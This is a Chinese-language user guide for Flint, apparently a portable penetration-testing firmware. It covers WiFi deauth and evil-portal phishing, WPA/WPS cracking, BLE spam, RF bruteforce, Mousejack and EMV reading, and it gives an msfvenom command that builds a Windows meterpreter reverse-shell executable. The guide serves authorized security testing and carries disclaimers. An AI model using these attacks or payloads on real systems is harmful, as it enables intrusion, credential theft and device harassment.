# Flint 功能概览与使用指南

> 创建日期: 2026-11-07  
> 适用版本: Flint 0.0.59  
> 平台: M5Stack CardputerZero  
> 许可证: GPL-3.0

---

## 目录

1. [简介](#1-简介)
2. [系统要求](#2-系统要求)
3. [工具分类总览](#3-工具分类总览)
4. [WiFi 工具](#4-wifi-工具)
5. [蓝牙工具](#5-蓝牙工具)
6. [射频工具](#6-射频工具)
7. [红外工具](#7-红外工具)
8. [NFC 工具](#8-nfc-工具)
9. [LoRa 工具](#9-lora-工具)
10. [GPS 工具](#10-gps-工具)
11. [网络工具](#11-网络工具)
12. [系统工具](#12-系统工具)
13. [游戏](#13-游戏)
14. [快捷键参考](#14-快捷键参考)
15. [硬件依赖](#15-硬件依赖)
16. [常见问题](#16-常见问题)

---

## 1. 简介

**Flint** 是一款运行在 M5Stack CardputerZero 上的便携式渗透测试固件，提供 WiFi、蓝牙、射频、红外、NFC 等多种无线协议的攻击与测试工具。

### 核心特性

- 🎯 **100+ 工具**：覆盖 WiFi、BLE、RF、IR、NFC、LoRa 等协议
- 📱 **便携设计**：320x170 屏幕适配，键盘快捷键操作
- 🔧 **模块化架构**：基于 YAML 配置的 ShellTool 快速封装 CLI 工具
- 💾 **数据保存**：自动保存扫描结果到 `~/flint/loot/` 目录
- 🌐 **Web 界面**：支持远程访问和屏幕投射

---

## 2. 系统要求

### 硬件要求

| 组件 | 最低要求 | 推荐配置 |
|------|----------|----------|
| 设备 | M5Stack CardputerZero | 带 Cap CC1101 扩展 |
| 内存 | 352MB RAM | 512MB+ |
| 存储 | 500MB 可用空间 | 2GB+ |
| WiFi | 内置 WiFi | 外接支持 Monitor 模式的 USB 网卡 |

### 软件要求

- **操作系统**: Debian 13 (Trixie) 或更新
- **Python**: 3.11+
- **Ruby**: 3.3+（msfvenom 需要）
- **蓝牙**: bluez 5.82+
- **射频**: CC1101 模块（可选）

---

## 3. 工具分类总览

| 类别 | 工具数量 | 主要功能 |
|------|----------|----------|
| **WiFi** | 25+ | 扫描、Deauth、Evil Portal、WPA 破解 |
| **蓝牙** | 8+ | BLE 扫描、设备枚举、FindMy 信标 |
| **射频** | 10+ | 433/315 MHz 信号扫描、重放、频谱分析 |
| **红外** | 3+ | TV-B-Gone、红外学习、信号发射 |
| **NFC** | 5+ | 卡片扫描、NDEF 读写、EMV 读取 |
| **LoRa** | 3+ | 点对点通信、参数配置 |
| **GPS** | 2+ | 位置信息、轨迹记录 |
| **网络** | 20+ | Nmap、Ping、Traceroute、Msfvenom |
| **系统** | 6+ | 文件管理、系统监控、Web 服务 |
| **游戏** | 3+ | 贪吃蛇、俄罗斯方块、乒乓球 |

---

## 4. WiFi 工具

### 4.1 WiFi Scan（WiFi 扫描）

**功能**: 扫描附近的 WiFi 接入点

**操作**:
- `OK` 开始扫描
- `▲▼` 滚动结果
- `BACK` 退出

**显示信息**:
- SSID（网络名称）
- BSSID（MAC 地址）
- 信号强度（RSSI）
- 信道（Channel）
- 加密方式（WPA2/WPA3 等）

### 4.2 WiFi Deauth（WiFi 去认证攻击）

**功能**: 发送 802.11 去认证帧，断开客户端连接

**依赖**: `aireplay-ng`（需要支持 Monitor 模式的网卡）

**参数**:
- `AP MAC`: 目标接入点的 MAC 地址
- `Client`: 目标客户端 MAC（留空攻击所有）
- `Count`: 发送包数量（0=持续）
- `Iface`: 监控接口（默认 wlan0mon）

**操作**:
- `▲▼` 选择目标
- `OK` 开始/停止攻击
- `BACK` 退出

**⚠️ 警告**: 仅用于授权测试，未经授权的使用是非法的！

### 4.3 Evil Portal（邪恶门户）

**功能**: 创建流氓 AP + 强制门户，捕获用户凭证

**工作流程**:
1. `hostapd` 创建 WiFi 热点
2. `dnsmasq` 提供 DHCP + DNS 劫持
3. `iptables` 重定向 HTTP 流量
4. 嵌入式 HTTP 服务器显示钓鱼页面
5. 凭证保存到 `loot/` 目录

**参数**:
- `SSID`: 热点名称
- `Template`: 钓鱼页面模板（支持多个预设）
- `Channel`: WiFi 信道

**⚠️ 警告**: 仅用于安全培训和授权测试！

### 4.4 Evil Twin（邪恶双子）

**功能**: 克隆现有 WiFi 网络，进行中间人攻击

**依赖**: `hostapd`, `dnsmasq`

### 4.5 Handshake Capture（握手包捕获）

**功能**: 捕获 WPA/WPA2 握手包用于离线破解

**依赖**: `airodump-ng`

**输出**: `~/flint/loot/WiFi/handshake_*.pcap`

### 4.6 WPA Crack（WPA 破解）

**功能**: 使用字典破解 WPA/WPA2 密码

**依赖**: `aircrack-ng`

**参数**:
- `Capture`: 握手包文件路径
- `Wordlist`: 字典文件路径

### 4.7 WPS Attack（WPS 攻击）

**功能**: 针对 WPS PIN 的攻击

**模式**:
- `Pixie Dust`: 离线 PIN 破解
- `Brute Force`: 在线暴力破解

**依赖**: `reaver` 或 `bully`

### 4.8 Beacon Spam（信标垃圾）

**功能**: 广播大量虚假 WiFi 网络

**模式**:
- `Random`: 随机 SSID
- `Funny`: 搞笑名称列表
- `Custom`: 自定义 SSID 列表

### 4.9 Packet Monitor（数据包监控）

**功能**: 实时监控 WiFi 数据包

**显示**:
- 数据包类型（Management/Data/Control）
- 源/目标 MAC
- 信号强度
- 包速率统计

### 4.10 Probe Scan（探针扫描）

**功能**: 捕获设备发送的 Probe Request，发现设备踪迹

**用途**: 
- 发现隐藏设备
- 追踪设备移动
- 分析设备行为

### 4.11 Karma 攻击

**功能**: 自动响应设备的 Probe Request，诱导连接

**原理**: 设备会广播之前连接过的网络名称（SSID），Karma 攻击自动创建这些网络

### 4.12 Pwnagotchi

**功能**: 自动化 WiFi 审计工具

**特性**:
- 自动捕获握手包
- 学习最优攻击策略
- 与其他 Pwnagotchi 互动

### 4.13 其他 WiFi 工具

| 工具 | 功能 | 依赖 |
|------|------|------|
| `airmon-ng` | 启用/禁用 Monitor 模式 | `aircrack-ng` |
| `airodump-ng` | 高级 WiFi 嗅探 | `aircrack-ng` |
| `aireplay-ng` | 包注入/去认证 | `aircrack-ng` |
| `bettercap` | 中间人攻击框架 | `bettercap` |
| `kismet` | WiFi 入侵检测 | `kismet` |
| `wavemon` | WiFi 信号监控 | `wavemon` |
| `nmcli` | NetworkManager 控制 | `network-manager` |
| `iw` | 无线接口配置 | `iw` |

---

## 5. 蓝牙工具

### 5.1 BLE Scan（BLE 扫描）

**功能**: 扫描附近的蓝牙低功耗设备

**显示**:
- 设备名称
- MAC 地址
- RSSI 信号强度
- 服务 UUID

### 5.2 BLE Spam（BLE 垃圾广播）

**功能**: 发送大量虚假 BLE 广播包

**目标设备**:
- **Apple**: AirPods, Apple Watch, iPhone, MacBook 等
- **Samsung**: Galaxy Buds, SmartThings 等
- **Google**: FastPair 设备
- **Windows**: SwiftPair 设备

**模式**:
- `Apple`: 模拟 Apple 设备配对弹窗
- `Samsung`: 模拟 Samsung 设备
- `Google`: 模拟 FastPair 设备
- `Windows`: 模拟 SwiftPair 设备
- `ALL`: 混合所有模式

**速度**:
- `Slow`: 150ms 间隔
- `Med`: 80ms 间隔
- `Fast`: 30ms 间隔
- `Vfast`: 10ms 间隔
- `Max`: 无间隔

**⚠️ 警告**: 可能造成设备骚扰，仅用于研究！

### 5.3 FindMy Beacon（FindMy 信标）

**功能**: 模拟 Apple FindMy / Samsung Find / Tile 追踪器

**特性**:
- 生成密钥对
- 广播信标
- 持久化保存（重启后恢复）

**参数**:
- `Tag Type`: Apple / Samsung / Tile
- `Interval`: 广播间隔（1/2/5/10 秒）

### 5.4 Bluetoothctl（蓝牙控制）

**功能**: 交互式蓝牙控制工具

**命令**:
- `scan on/off`: 开始/停止扫描
- `devices`: 列出已知设备
- `pair <MAC>`: 配对设备
- `connect <MAC>`: 连接设备
- `disconnect <MAC>`: 断开连接
- `info <MAC>`: 查看设备信息
- `show`: 显示控制器信息

### 5.5 其他蓝牙工具

| 工具 | 功能 | 依赖 |
|------|------|------|
| `bleah` | BLE 设备枚举 | `bleah` |
| `btmon` | 蓝牙协议监控 | `bluez` |
| `gatttool` | GATT 协议交互 | `bluez` |
| `ubertooth` | Ubertooth 硬件控制 | `ubertooth` |

---

## 6. 射频工具

### 6.1 RF Scan（射频扫描）

**功能**: 扫描 433/315 MHz 频段的射频信号

**硬件**: CC1101 模块（通过 SPI 连接）

**操作**:
- `OK` 扫描/重放捕获的信号
- `TAB` 重新扫描
- `BACK` 退出

**显示**:
- 频率（MHz）
- 信号强度
- 调制类型
- 原始数据

### 6.2 RF Listen（射频监听）

**功能**: 持续监听指定频率的信号

**参数**:
- `Frequency`: 目标频率（MHz）
- `Modulation`: 调制类型（ASK/FSK/GFSK）

### 6.3 RF Signal Gen（射频信号生成）

**功能**: 生成指定频率的射频信号

**用途**: 测试接收器、校准设备

### 6.4 RF Spectrum（射频频谱）

**功能**: 显示射频频谱图

**显示**: 频率 vs 信号强度的实时图表

### 6.5 RF Bruteforce（射频暴力破解）

**功能**: 暴力破解射频遥控器

**支持协议**:
- 车库门（315/433 MHz）
- 无线开关
- 简单编码遥控器

**⚠️ 警告**: 仅用于自己的设备！

### 6.6 Sub-GHz Wardriving（Sub-GHz 漫游）

**功能**: 记录沿途的 Sub-GHz 信号

**用途**: 映射无线设备分布

### 6.7 nRF24 Mousejack

**功能**: 攻击 nRF24 无线鼠标/键盘

**原理**: 注入恶意数据包控制目标设备

**硬件**: nRF24LU1+ USB 适配器

### 6.8 频率预设

**常用 ISM 频率**:
- 315 MHz: 美国车库门、遥控器
- 433.92 MHz: 欧洲遥控器、气象站
- 868 MHz: 欧洲 IoT 设备
- 915 MHz: 美国 LoRa、IoT

---

## 7. 红外工具

### 7.1 TV-B-Gone（电视关机）

**功能**: 关闭附近电视

**区域**:
- `ALL`: 所有区域代码
- `NA`: 北美电视品牌
- `EU`: 欧洲电视品牌

**品牌支持**: Samsung, LG, Sony, Panasonic, Philips, Sharp, Toshiba 等 100+ 品牌

**操作**:
- `▲▼` 选择区域/品牌
- `OK` 发射红外代码
- `BACK` 退出

**硬件**: 内置红外发射器（GPIO 12）

### 7.2 IR Settings（红外设置）

**功能**: 配置红外参数

**参数**:
- `Protocol`: NEC / RC5 / RC6 / Sony
- `Frequency`: 载波频率（38kHz 默认）

### 7.3 IR Learn（红外学习）

**功能**: 学习红外遥控器的代码

**流程**:
1. 选择 "Learn" 模式
2. 按下遥控器按键
3. 保存代码到文件

---

## 8. NFC 工具

### 8.1 NFC Scan（NFC 扫描）

**功能**: 扫描 NFC/RFID 卡片

**支持类型**:
- MIFARE Classic 1K/4K
- MIFARE Ultralight / NTAG
- ISO 14443-4 (ISO-DEP)
- EMV 银行卡

**显示**:
- UID（卡号）
- SAK（选择应答）
- ATQA（应答）
- 卡片类型

**数据保存**: `~/flint/loot/NFC/`

### 8.2 NFC NDEF Writer（NDEF 写入器）

**功能**: 向 NFC 标签写入 NDEF 数据

**支持类型**:
- URL: 网址
- Text: 文本
- URI: 自定义 URI
- vCard: 联系人

### 8.3 NFC APDU（APDU 命令）

**功能**: 发送原始 APDU 命令到智能卡

**用途**: 高级卡片交互、自定义命令

### 8.4 EMV Read（EMV 读取）

**功能**: 读取银行卡（EMV）信息

**显示**:
- 卡号（PAN）
- 有效期
- 卡组织（Visa/Mastercard 等）
- 交易历史（部分卡）

**⚠️ 注意**: 仅用于自己的卡片！

### 8.5 NFC Settings（NFC 设置）

**功能**: 配置 NFC 参数

**参数**:
- `Reader Mode`: 启用/禁用
- `Poll Interval`: 轮询间隔

---

## 9. LoRa 工具

### 9.1 LoRa Radio（LoRa 无线电）

**功能**: 点对点 LoRa 通信

**硬件**: SX1262 模块

**参数**:
- `Frequency`: 频率（默认 915 MHz）
- `Spreading Factor`: SF7-SF12
- `Bandwidth`: 125/250/500 kHz
- `Coding Rate`: 4/5, 4/6, 4/7, 4/8
- `Power`: 发射功率（dBm）

**操作**:
- `OK` 发送测试包
- `TAB` 开始接收
- `BACK` 退出

### 9.2 LoRa Settings（LoRa 设置）

**功能**: 配置 LoRa 参数

**预设**:
- `Long Range`: SF12, 125kHz（最远距离）
- `Fast`: SF7, 500kHz（最快速度）
- `Balanced`: SF9, 250kHz（平衡）

---

## 10. GPS 工具

### 10.1 GPS Info（GPS 信息）

**功能**: 显示实时 GPS 位置

**显示**:
- 纬度/经度
- 海拔高度
- 定位质量（Fix Quality）
- 卫星数量
- HDOP（精度因子）

**操作**:
- `OK` 刷新位置
- `BACK` 退出

### 10.2 GPS Settings（GPS 设置）

**功能**: 配置 GPS 参数

**参数**:
- `Baud Rate`: 串口波特率
- `Update Rate`: 更新频率

---

## 11. 网络工具

### 11.1 Nmap（网络扫描）

**功能**: 网络发现和安全审计

**扫描类型**:
- `ping`: 主机发现（-sn）
- `quick`: 快速扫描（-F）
- `service`: 服务版本检测（-sV）

**参数**:
- `Target`: 目标（IP/CIDR）
- `Ports`: 端口范围
- `Timing`: 速度等级（T1-T5）
- `Skip Ping`: 跳过主机发现（-Pn）

### 11.2 Ping

**功能**: ICMP 回显测试

**参数**:
- `Host`: 目标主机
- `Count`: 包数量
- `Interval`: 间隔（秒）

### 11.3 Traceroute / Tracepath

**功能**: 路由追踪

**显示**: 每一跳的 IP、延迟、丢包率

### 11.4 MTR（My Traceroute）

**功能**: 结合 ping 和 traceroute 的实时路由分析

**显示**: 实时更新的路由图

### 11.5 ARP Scan

**功能**: 局域网主机发现

**原理**: ARP 请求广播

**显示**: IP、MAC、厂商信息

### 11.6 Masscan

**功能**: 高速端口扫描

**速度**: 每秒数百万包

**参数**:
- `Target`: 目标范围
- `Ports`: 端口列表
- `Rate`: 扫描速率

### 11.7 DNS Tools

**dig**: DNS 查询
**nslookup**: 域名解析
**whois**: 域名注册信息查询

### 11.8 HTTP Tools

**curl**: HTTP 请求
**wget**: 文件下载

### 11.9 Netcat (nc)

**功能**: 网络瑞士军刀

**用途**:
- 端口监听
- 文件传输
- 远程 Shell

### 11.10 Socat

**功能**: 多功能网络中继

**用途**: 端口转发、协议转换

### 11.11 Msfvenom（Payload 生成）

**功能**: 生成 Metasploit payload

**Payload 类型**:
- `linux/x64/meterpreter/reverse_tcp`
- `windows/x64/meterpreter/reverse_tcp`
- `python/meterpreter/reverse_tcp`
- `android/meterpreter/reverse_tcp`
- 等等...

**参数**:
- `Payload`: 选择 payload
- `LHOST`: 回调地址
- `LPORT`: 回调端口
- `Format`: 输出格式（elf/exe/raw/python/bash 等）
- `Encoder`: 编码器（shikata_ga_nai 等）
- `Output`: 输出文件路径

**示例**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 LPORT=4444 \
    -f exe -o payload.exe
```

### 11.12 其他网络工具

| 工具 | 功能 |
|------|------|
| `fping` | 批量 ping |
| `avahi-browse` | mDNS 服务发现 |
| `nbtscan` | NetBIOS 扫描 |
| `anomaly_detector` | 网络异常检测 |
| `cctv_scanner` | CCTV 摄像头扫描 |
| `dns_spoof` | DNS 欺骗 |
| `payload_gen` | Payload 生成器 |

---

## 12. 系统工具

### 12.1 About（关于）

**功能**: 显示 Flint 版本、硬件信息、许可证

**信息**:
- 版本号
- 平台（CardputerZero）
- 仓库地址
- 许可证（GPL-3.0）
- 贡献者列表

### 12.2 Settings（设置）

**功能**: 系统配置

**选项**:
- 主题（明/暗）
- 语言
- 屏幕亮度
- 音量
- WiFi 配置

### 12.3 File Manager（文件管理器）

**功能**: 浏览和管理文件

**操作**:
- `▲▼` 导航
- `OK` 打开/进入
- `TAB` 文件操作（复制/移动/删除）
- `BACK` 返回

### 12.4 System Monitor（系统监控）

**功能**: 实时系统状态

**显示**:
- CPU 使用率
- 内存使用
- 磁盘空间
- 电池电量
- 温度
- 网络流量

### 12.5 Web Server（Web 服务）

**功能**: 启动 Web 管理界面

**特性**:
- 远程屏幕查看
- 工具控制
- 文件下载

**访问**: `http://<device-ip>:8080`

### 12.6 Home（主页）

**功能**: 返回主菜单

---

## 13. 游戏

### 13.1 Snake（贪吃蛇）

**操作**:
- `▲▼◀▶` 移动方向
- `OK` 暂停/继续
- `BACK` 退出

### 13.2 Tetris（俄罗斯方块）

**操作**:
- `◀▶` 左右移动
- `▲` 旋转
- `▼` 加速下落
- `OK` 暂停
- `BACK` 退出

### 13.3 Pong（乒乓球）

**操作**:
- `▲▼` 移动挡板
- `OK` 开始游戏
- `BACK` 退出

---

## 14. 快捷键参考

### 全局快捷键

| 按键 | 功能 |
|------|------|
| `OK` (Enter) | 确认/主要操作 |
| `BACK` (ESC) | 返回/退出 |
| `TAB` | 次要操作/切换 |
| `▲▼◀▶` | 导航/选择 |
| `F1` / `KEY1` | 帮助（保留） |
| `F2` / `KEY2` | 附加功能 1 |
| `F3` / `KEY3` | 附加功能 2 |
| `F4` / `KEY4` | 附加功能 3 |

### 物理按键映射

CardputerZero 物理键盘：
- `OK` = Enter 键
- `BACK` = ESC 键（长按返回主页）
- `TAB` = TAB 键
- `KEY1-KEY4` = 数字键 1-4

---

## 15. 硬件依赖

### 必需硬件

| 组件 | 用途 | 状态 |
|------|------|------|
| WiFi 芯片 | WiFi 工具 | ✅ 内置 |
| 蓝牙芯片 | BLE 工具 | ✅ 内置 |
| 红外发射器 | TV-B-Gone | ✅ 内置 |
| 键盘 | 用户输入 | ✅ 内置 |
| 屏幕 | 显示 | ✅ 内置 |

### 可选硬件

| 组件 | 用途 | 接口 |
|------|------|------|
| CC1101 模块 | Sub-GHz 射频 | SPI |
| nRF24LU1+ | Mousejack 攻击 | USB |
| SX1262 模块 | LoRa 通信 | SPI |
| NFC 模块 | NFC/RFID 读写 | I2C/SPI |
| GPS 模块 | 位置信息 | UART |
| USB WiFi 网卡 | Monitor 模式 | USB |

### 外部工具依赖

| 工具 | 用途 | 安装 |
|------|------|------|
| `aircrack-ng` | WiFi 审计 | `apt install aircrack-ng` |
| `reaver` | WPS 攻击 | `apt install reaver` |
| `bettercap` | MITM 框架 | `apt install bettercap` |
| `kismet` | WiFi 检测 | `apt install kismet` |
| `nmap` | 网络扫描 | `apt install nmap` |
| `metasploit-framework` | 渗透测试 | 手动安装（见文档） |

---

## 16. 常见问题

### Q1: WiFi Deauth 不工作？

**A**: 需要支持 Monitor 模式的 USB WiFi 网卡。内置 WiFi 不支持。

**检查**:
```bash
iw dev
# 查看是否有 wlan0mon 接口
```

### Q2: BLE Spam 没有效果？

**A**: 确保蓝牙已开启，目标设备在范围内（< 10 米）。

**检查**:
```bash
bluetoothctl show
# 确保 Powered: yes
```

### Q3: RF Scan 没有信号？

**A**: 需要 CC1101 模块，并正确连接到 SPI 接口。

**检查**:
```bash
ls /dev/spidev*
# 应该看到 /dev/spidev0.0
```

### Q4: NFC Scan 读不到卡？

**A**: 确保卡片是 NFC 类型（不是所有 RFID 都支持），并紧贴读卡器。

**支持**: MIFARE、NTAG、ISO 14443-4

### Q5: Msfvenom 报错？

**A**: 需要安装 Metasploit Framework（约 650MB）。

**安装**: 参考 [Flint 依赖包修复文档](flint-dependencies-fix.md)

### Q6: 如何保存扫描结果？

**A**: 自动保存到 `~/flint/loot/` 目录，按类别组织：
- `~/flint/loot/WiFi/`
- `~/flint/loot/NFC/`
- `~/flint/loot/BLE/`

### Q7: 如何更新 Flint？

**A**: 通过 Store 应用更新，或手动下载 deb 包：
```bash
sudo dpkg -i flint_*.deb
```

### Q8: 电池续航多久？

**A**: 约 2-4 小时，取决于使用强度。建议外接电源进行长时间测试。

---

## 附录

### A. 数据保存位置

```
~/flint/loot/
├── WiFi/
│   ├── handshakes/
│   ├── captures/
│   └── wordlists/
├── NFC/
│   ├── dumps/
│   └── ndef/
├── BLE/
│   └── captures/
├── RF/
│   └── signals/
└── IR/
    └── codes/
```

### B. 配置文件位置

```
/etc/flint/
├── config.yaml          # 主配置
├── wifi.yaml            # WiFi 配置
├── rf.yaml              # 射频配置
└── ir/
    └── tvbgone.ir       # TV-B-Gone 代码库
```

### C. 相关资源

- **GitHub**: https://github.com/flintdevices/flint
- **文档**: https://flintdevices.github.io/docs
- **社区**: https://discord.gg/flint
- **CardputerZero**: https://cardputer.cc

---

## 免责声明

**⚠️ 重要警告**:

1. **合法性**: 本工具仅用于授权的安全测试、教育和研究目的。未经授权的攻击是非法的。

2. **责任**: 使用本工具造成的任何损害由用户自行承担。

3. **道德**: 请遵守当地法律法规，尊重他人隐私和财产。

4. **安全**: 某些工具可能使设备处于不稳定状态，请谨慎使用。

---

*文档版本: 1.0*  
*最后更新: 2026-11-07*  
*作者: CardputerZero 项目团队*
